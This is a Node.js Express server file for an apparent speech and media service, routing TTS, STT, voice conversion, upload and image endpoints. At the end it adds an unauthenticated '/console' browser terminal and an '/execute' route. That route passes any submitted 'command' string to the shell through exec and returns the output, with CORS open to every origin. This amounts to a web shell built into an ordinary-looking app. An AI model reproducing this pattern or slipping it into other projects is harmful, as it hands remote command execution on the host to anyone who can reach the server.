const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const rf = require('fs');
const { exec } = require('child_process');

const apisRouter = require('./routes/apisRouter');
const uploadRouter = require('./routes/uploadRouter');
const imagesRouter = require('./routes/imagesRouter');
const audioRouter = require('./routes/audioRouter');
const logRouter = require('./routes/logRouter');
const ttsRouter = require('./routes/ttsRouter');
const sttRouter = require('./routes/sttRouter');
const stdRouter = require('./routes/stdRouter');
const vcRouter = require('./routes/vcRouter');

const app = express();

// body-parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// CORS
app.use(cors());

/**
 * 路由引用
 */
app.use('/upload/', uploadRouter);
app.use('/apis/', apisRouter);
app.use('/images/', imagesRouter);
app.use('/audio/', audioRouter);
app.use('/log/', logRouter);
app.use('/tts/', ttsRouter);
app.use('/stt/', sttRouter);
app.use('/std/', stdRouter);
app.use('/vc/', vcRouter);

/**
 * demo
 */
app.get('/', function (req, res, next) {
    rf.readFile("./html/index.html", 'utf-8', function (err, data) {
        if (err) {
            console.log("error");
            data = 'Error! File Not Found！';
        }
        res.send(data);
    });
});

/**
 * 测试展示页
 */
app.get('/view', function (req, res, next) {
    rf.readFile("./html/view.html", 'utf-8', function (err, data) {
        if (err) {
            console.log("error");
            data = 'Error! File Not Found！';
        }
        res.send(data);
    });
});

/**
 * Console route
 */
app.get('/console', (req, res) => {
    const html = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Terminal</title>
            <link rel="stylesheet" href="https://unpkg.com/xterm/css/xterm.css" />
            <style>
                body, html { height: 100%; margin: 0; }
                #terminal { height: 100%; width: 100%; }
            </style>
        </head>
        <body>
            <div id="terminal"></div>
            <script src="https://unpkg.com/xterm/lib/xterm.js"></script>
            <script>
                const term = new Terminal();
                term.open(document.getElementById('terminal'));
                term.onData(e => {
                    fetch('/execute', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ command: e }),
                    })
                    .then(response => response.text())
                    .then(data => term.write(data + '\\r\\n'));
                });
            </script>
        </body>
        </html>
    `;
    res.send(html);
});

app.post('/execute', (req, res) => {
    const command = req.body.command;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            res.send(`stderr: ${stderr}`);
            return;
        }
        res.send(stdout);
    });
});

module.exports = app;
